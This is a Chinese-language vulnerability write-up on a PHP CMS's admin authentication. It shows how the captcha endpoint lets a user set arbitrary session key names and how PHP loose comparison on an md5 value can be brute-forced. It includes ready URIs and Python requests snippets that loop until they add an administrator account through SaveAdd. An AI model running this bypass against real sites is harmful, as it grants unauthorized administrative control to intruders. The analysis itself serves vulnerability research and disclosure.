App/Lib/Action/BaseAction.class.php

到这我们可以发现传入的verify参数被作为session键名，键值来自于随机字符串的md5值，到这我们可能觉得没有什么特别的地方，但是这个cms并不是一般的奇葩，他对用户身份的校验更加奇特。


用户身份校验部分：

App/Lib/Action/AdminBaseAction.class.php

主要如下两个IF语句


  • isLogin 判断用户是否登录

  • checkPurview 检查用户权限

我们先看isLogin

这里会判断用户session是否存在AdminID和AdminName键名，无论值是什么，只要存在即可返回True。

那么我们只需要利用上文验证码可以设置session键名的点，访问如下两条URI即可绕过该函数的验证，返回True。

/index.php/public/verifyCode?length=4&mode=1&width=22&height=22&verify=AdminID&type=png
/index.php/public/verifyCode?length=4&mode=1&width=22&height=22&verify=AdminName&type=png

接下来是checkPurview

这里从session中取出AdminGroupID的值，判断是否==1，等于1的话就直接返回True不进行接下来的用户权限判断了，巧的是这里使用的是== 松散比较（PHP弱类型），具体就是：

  • ===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较

  • ==在进行比较的时候，会先将字符串类型转化成相同，再比较

会造成如下状况：

简而言之当md5的值是1开头的时候，PHP进行类型转换时会将它变成1，通过这个特性我们就可以绕过$gid == 1


进行暴力枚举一个可用的session。

漏洞验证


这里我们需要一个靶点，来验证我们爆破时的session是否有效，我这里使用了它的添加用户接口：

/index.php/Admin/admin/SaveAdd

首先我们先从登录接口获取系统分配给我们的一个PHPSESSION

session = requests.session()session.get(target+"/index.php/Admin/public/Login")

接着开始为我们的session添加键名

session.get(target +"/index.php/public/verifyCode?length=4&mode=1&width=22&height=22&verify=AdminID&type=png")session.get(target +"/index.php/public/verifyCode?length=4&mode=1&width=22&height=22&verify=AdminName&type=png")session.get(target +"/index.php/public/verifyCode?length=4&mode=1&width=22&height=22&verify=AdminGroupID&type=png")

通过添加用户接口验证AdminGroupID是否==1，这里不跟随跳转，如果状态码是200那么用户会被添加成功，否则释放requests session进入下一轮循环。


res = session.post(target +"/index.php/Admin/admin/SaveAdd",headers=headers,data=data,allow_redirects=False)    if res.status_code == 200:        print('session is ok!')        break    session.close()
